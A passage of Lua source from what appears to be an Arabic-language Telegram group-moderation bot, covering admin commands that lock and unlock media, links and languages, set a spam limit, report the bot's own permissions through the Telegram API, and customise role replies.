DevAbd:del(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التعديل الميديا" or UnLockText[2] == "تعديل الميديا" then
if DevAbd:get(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح تعديل الميديا")  
DevAbd:del(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه" then
if DevAbd:get(TRON..'Abd:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفارسيه")  
DevAbd:del(TRON..'Abd:Lock:Farsi'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفشار" then
if not DevAbd:get(TRON..'Abd:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفشار")  
DevAbd:set(TRON..'Abd:Lock:Fshar'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الطائفيه" then
if not DevAbd:get(TRON..'Abd:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الطائفيه")  
DevAbd:set(TRON..'Abd:Lock:Taf'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكفر" then
if not DevAbd:get(TRON..'Abd:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الكفر")  
DevAbd:set(TRON..'Abd:Lock:Kfr'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه بالطرد" then
if DevAbd:get(TRON..'Abd:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفارسيه بالطرد")  
DevAbd:del(TRON..'Abd:Lock:FarsiBan'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if UnLockText[2] == "البوتات" or UnLockText[2] == "البوتات بالطرد" or UnLockText[2] == "البوتات بالتقييد" or UnLockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح البوتات")  
DevAbd:del(TRON.."Abd:Lock:Bots"..msg.chat_id_)  
end
if UnLockText[2] == "التكرار" then 
DevAbd:hdel(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevAbd:get(TRON..'Abd:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التثبيت")  
DevAbd:del(TRON..'Abd:Lock:Pin'..msg.chat_id_)
DevAbd:srem(TRON.."Abd:Lock:Pinpin",msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
--     Source TRON     --
if Admin(msg) then
if text and text:match("^قفل (.*)$") then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "الدردشه" then
if not DevAbd:get(TRON..'Abd:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الدردشه")  
DevAbd:set(TRON..'Abd:Lock:Text'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not DevAbd:get(TRON..'Abd:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاونلاين")  
DevAbd:set(TRON..'Abd:Lock:Inline'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not DevAbd:get(TRON..'Abd:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الصور")  
DevAbd:set(TRON..'Abd:Lock:Photo'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not DevAbd:get(TRON..'Abd:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الكلايش")  
DevAbd:set(TRON..'Abd:Lock:Spam'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not DevAbd:get(TRON..'Abd:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الدخول")  
DevAbd:set(TRON..'Abd:Lock:Join'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not DevAbd:get(TRON..'Abd:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفيديو")  
DevAbd:set(TRON..'Abd:Lock:Videos'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not DevAbd:get(TRON..'Abd:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المتحركه")  
DevAbd:set(TRON..'Abd:Lock:Gifs'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not DevAbd:get(TRON..'Abd:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاغاني")  
DevAbd:set(TRON..'Abd:Lock:Music'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not DevAbd:get(TRON..'Abd:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الصوت")  
DevAbd:set(TRON..'Abd:Lock:Voice'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الروابط")  
DevAbd:set(TRON..'Abd:Lock:Links'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not DevAbd:get(TRON..'Abd:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المواقع")  
DevAbd:set(TRON..'Abd:Lock:Location'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المعرفات")  
DevAbd:set(TRON..'Abd:Lock:Tags'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not DevAbd:get(TRON..'Abd:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الملفات")  
DevAbd:set(TRON..'Abd:Lock:Document'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الهاشتاك")  
DevAbd:set(TRON..'Abd:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not DevAbd:get(TRON..'Abd:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الجهات")  
DevAbd:set(TRON..'Abd:Lock:Contact'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '️⌁︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الشبكات")  
DevAbd:set(TRON..'Abd:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل العربيه")  
DevAbd:set(TRON..'Abd:Lock:Arabic'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الانكليزيه")  
DevAbd:set(TRON..'Abd:Lock:English'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not DevAbd:get(TRON..'Abd:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الملصقات")  
DevAbd:set(TRON..'Abd:Lock:Stickers'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not DevAbd:get(TRON..'Abd:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الماركداون")  
DevAbd:set(TRON..'Abd:Lock:Markdown'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not DevAbd:get(TRON..'Abd:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاشعارات")  
DevAbd:set(TRON..'Abd:Lock:TagServr'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التوجيه")  
DevAbd:set(TRON..'Abd:Lock:Forwards'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
--     Source TRON     --
if Admin(msg) then
if text and text:match("^فتح (.*)$") then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "الدردشه" then
if DevAbd:get(TRON..'Abd:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الدردشه")  
DevAbd:del(TRON..'Abd:Lock:Text'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if DevAbd:get(TRON..'Abd:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الصور")  
DevAbd:del(TRON..'Abd:Lock:Photo'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevAbd:get(TRON..'Abd:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الكلايش")  
DevAbd:del(TRON..'Abd:Lock:Spam'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if DevAbd:get(TRON..'Abd:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الدخول")  
DevAbd:del(TRON..'Abd:Lock:Join'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if DevAbd:get(TRON..'Abd:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفيديو")  
DevAbd:del(TRON..'Abd:Lock:Videos'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if DevAbd:get(TRON..'Abd:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الملفات")  
DevAbd:del(TRON..'Abd:Lock:Document'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if DevAbd:get(TRON..'Abd:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاونلاين")  
DevAbd:del(TRON..'Abd:Lock:Inline'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if DevAbd:get(TRON..'Abd:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الماركداون")  
DevAbd:del(TRON..'Abd:Lock:Markdown'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if DevAbd:get(TRON..'Abd:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المتحركه")  
DevAbd:del(TRON..'Abd:Lock:Gifs'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if DevAbd:get(TRON..'Abd:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاغاني")  
DevAbd:del(TRON..'Abd:Lock:Music'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if DevAbd:get(TRON..'Abd:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الصوت")  
DevAbd:del(TRON..'Abd:Lock:Voice'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الروابط")  
DevAbd:del(TRON..'Abd:Lock:Links'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if DevAbd:get(TRON..'Abd:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المواقع")  
DevAbd:del(TRON..'Abd:Lock:Location'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المعرفات")  
DevAbd:del(TRON..'Abd:Lock:Tags'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الهاشتاك")  
DevAbd:del(TRON..'Abd:Lock:Hashtak'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if DevAbd:get(TRON..'Abd:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الجهات")  
DevAbd:del(TRON..'Abd:Lock:Contact'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الشبكات")  
DevAbd:del(TRON..'Abd:Lock:WebLinks'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح العربيه")  
DevAbd:del(TRON..'Abd:Lock:Arabic'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الانكليزيه")  
DevAbd:del(TRON..'Abd:Lock:English'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if DevAbd:get(TRON..'Abd:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاشعارات")  
DevAbd:del(TRON..'Abd:Lock:TagServr'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if DevAbd:get(TRON..'Abd:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الملصقات")  
DevAbd:del(TRON..'Abd:Lock:Stickers'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التوجيه")  
DevAbd:del(TRON..'Abd:Lock:Forwards'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
--     Source TRON     --
if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") then
if not Constructor(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
else
DevAbd:set(TRON.."Abd:Lock:Bots"..msg.chat_id_,"del") DevAbd:hset(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Abd:Lock:Links','Abd:Lock:Contact','Abd:Lock:Forwards','Abd:Lock:Videos','Abd:Lock:Gifs','Abd:Lock:EditMsgs','Abd:Lock:Stickers','Abd:Lock:Farsi','Abd:Lock:Spam','Abd:Lock:WebLinks','Abd:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevAbd:set(TRON..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التفليش")  
end
end
if text and text:match("^فتح التفليش$") then
if not Constructor(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
else
DevAbd:hdel(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Abd:Lock:Links','Abd:Lock:Contact','Abd:Lock:Forwards','Abd:Lock:Videos','Abd:Lock:Gifs','Abd:Lock:EditMsgs','Abd:Lock:Stickers','Abd:Lock:Farsi','Abd:Lock:Spam','Abd:Lock:WebLinks','Abd:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
DevAbd:del(TRON..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التفليش")  
end
end
--     Source TRON     --
if text and text:match("^قفل الكل$") then
if not Constructor(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
else
DevAbd:del(TRON..'Abd:Lock:Fshar'..msg.chat_id_) DevAbd:del(TRON..'Abd:Lock:Taf'..msg.chat_id_) DevAbd:del(TRON..'Abd:Lock:Kfr'..msg.chat_id_) 
DevAbd:set(TRON.."Abd:Lock:Bots"..msg.chat_id_,"del") DevAbd:hset(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Abd:Lock:EditMsgs','Abd:Lock:Farsi','Abd:Lock:TagServr','Abd:Lock:Inline','Abd:Lock:Photo','Abd:Lock:Spam','Abd:Lock:Videos','Abd:Lock:Gifs','Abd:Lock:Music','Abd:Lock:Voice','Abd:Lock:Links','Abd:Lock:Location','Abd:Lock:Tags','Abd:Lock:Stickers','Abd:Lock:Markdown','Abd:Lock:Forwards','Abd:Lock:Document','Abd:Lock:Contact','Abd:Lock:Hashtak','Abd:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevAbd:set(TRON..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل جميع الاوامر")  
end
end
if text and text:match("^فتح الكل$") then
if not Constructor(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
else
DevAbd:set(TRON..'Abd:Lock:Fshar'..msg.chat_id_,true) DevAbd:set(TRON..'Abd:Lock:Taf'..msg.chat_id_,true) DevAbd:set(TRON..'Abd:Lock:Kfr'..msg.chat_id_,true) DevAbd:hdel(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Abd:Lock:EditMsgs','Abd:Lock:Text','Abd:Lock:Arabic','Abd:Lock:English','Abd:Lock:Join','Abd:Lock:Bots','Abd:Lock:Farsi','Abd:Lock:FarsiBan','Abd:Lock:TagServr','Abd:Lock:Inline','Abd:Lock:Photo','Abd:Lock:Spam','Abd:Lock:Videos','Abd:Lock:Gifs','Abd:Lock:Music','Abd:Lock:Voice','Abd:Lock:Links','Abd:Lock:Location','Abd:Lock:Tags','Abd:Lock:Stickers','Abd:Lock:Markdown','Abd:Lock:Forwards','Abd:Lock:Document','Abd:Lock:Contact','Abd:Lock:Hashtak','Abd:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
DevAbd:del(TRON..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح جميع الاوامر")  
end
end
--     Source TRON     --
if Admin(msg) then
if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙اختر عدد اكبر من 40 حرف ', 1, 'md')
else
DevAbd:set(TRON..'Abd:Spam:Text'..msg.chat_id_,SetSpam)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
end
end
end
--     Source TRON     --
if Manager(msg) then
if text == "فحص" or text == "فحص البوت" then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..TRON)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙صلاحيات البوت هي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙حذف الرسائل ↫ '..DEL..'\n⌁︙دعوة المستخدمين ↫ '..INV..'\n⌁︙حظر المستخدمين ↫ '..BAN..'\n⌁︙تثبيت الرسائل ↫ '..PIN..'\n⌁︙تغيير المعلومات ↫ '..EDT..'\n⌁︙اضافة مشرفين ↫ '..VIP..'\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
DevAbd:set(TRON.."Abd:SudoBot:Rd"..msg.chat_id_,Text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
DevAbd:set(TRON.."Abd:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevAbd:set(TRON.."Abd:Constructor:Rd"..msg.chat_id_,Text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
